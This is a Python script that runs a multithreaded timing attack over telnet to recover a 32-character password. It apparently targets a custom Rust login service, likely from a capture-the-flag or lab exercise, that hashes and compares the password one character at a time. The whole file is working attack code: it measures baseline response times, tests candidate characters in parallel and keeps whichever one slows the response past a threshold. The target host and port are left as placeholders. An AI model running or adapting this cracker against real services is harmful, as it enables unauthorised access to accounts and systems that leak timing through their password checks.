#!/usr/bin/env python3

import hashlib
from telnetlib import Telnet
import time
import statistics
from multiprocessing import Pool
import sys


BASELINE_REPS 	= 3 		# amount of repetitions to determine the baseline
EPSILON		= 500000000	# threshold for the timing attack in ns  (hardcoded - but could be automated)
CRACK_N_CHARS	= 32		# amount of characters to crack
INVALID_CHAR	= 'T'		# specify a character that is guaranteed to be wrong (for determining the baseline)

allowed_chars = "0123456789abcdefghijklmnopqrstuvwxyz" # list of characters to try for cracking


PASSWORD = "" # if you already know some first characters you can put them in here

target 	= "<CHANGEME>"
port	= <CHANGEME>

pool = None
responses = {}

class fc:
        cyan = '\033[96m'
        green = '\033[92m'
        orange = '\033[93m'
        red = '\033[91m'
        end = '\033[0m'
        bold = '\033[1m'

def getBaseline(password):
	baselines = []
	for i in range(BASELINE_REPS):
		with Telnet(target, port) as tn:
			tn.read_until(b'password:\n')
			tn.write(password.encode()+(INVALID_CHAR.encode())*(CRACK_N_CHARS-len(password)))
			starttime = time.time_ns()
			tn.write(b'\n') # press enter
			tn.read_all() 	# blocks until connection closes
			stoptime = time.time_ns()
			baselines.append(stoptime-starttime)
	return statistics.mean(baselines)

def test(password,char,baseline,n):
	password = (password + char + INVALID_CHAR*(CRACK_N_CHARS-1-len(password))).encode()
	timing = baseline
	with Telnet(target, port) as tn:
		tn.read_until(b'password:\n')
		tn.write(password)
		starttime = time.time_ns()
		tn.write(b'\n') 	# press enter
		resp = tn.read_all() 	# blocks until connection closes
		stoptime = time.time_ns()
		timing = stoptime-starttime
	if ((timing-baseline) > EPSILON):
		return (True, char, n, resp)
	return (False, char, n, resp)

def callback(ret):
	valid, char, n, resp = ret
	if not valid:
		global responses
		if (n == (CRACK_N_CHARS-1)): # if this is the last character store all responses
			responses[char]=resp
		return
	global pool
	global PASSWORD
	pool.terminate() # cancel running tasks when we found the right character
	PASSWORD += char # update the correct password

def main():
	global pool
	global PASSWORD
	global responses
	print(f'{fc.green}[>]{fc.end} Start cracking...')
	for i in range(len(PASSWORD),CRACK_N_CHARS):
		baseline = getBaseline(PASSWORD)
		print(f'{fc.green}[>]{fc.orange} (Cracking) {fc.green}{PASSWORD}{fc.orange}?{fc.red}{"X"*(CRACK_N_CHARS-1-len(PASSWORD))}{fc.end}', end='\r')
		try:
			with Pool(processes=18) as pool: # telnet allows a maximum of 30 parallel connections by default
				tests = []
				for char in allowed_chars:
					tests.append(pool.apply_async(test, args=(PASSWORD,char,baseline,i,), callback=callback))
				pool.close()
				pool.join()

			continue
		except Exception as e:
			print()
			print(f'{fc.red}[>] Aborted: {fc.end}{e}')
			sys.exit(1)
	print()
	print(f'{fc.green}[>]{fc.end} The final password is: {fc.bold}{fc.green}{PASSWORD}{fc.orange}?{fc.end}')
	print(f'{fc.cyan}[>]{fc.end} Here are the responses for all possible final characters:')
	for char, resp in responses.items():
		print(f'[{fc.cyan}{char}{fc.end}]: {resp}')

if __name__=='__main__':
	banner=f'''
 {fc.green}[x]{fc.end} Multithreaded timing attack on a vulnerable Rust login application via telnet (@crackcat)

{fc.cyan}(Info){fc.end}: This tool was developed to target a custom service, written in Rust, that reads 32 characters
        and then starts to (time-expensively) hash each character one by one and immediately compares
	the result to a password. This allows for a timing attack. We use pythons telnetlib for the
	connection, time.time_ns() for the timing and multiprocessing.pool for faster cracking.
'''
	print(banner)
	main()
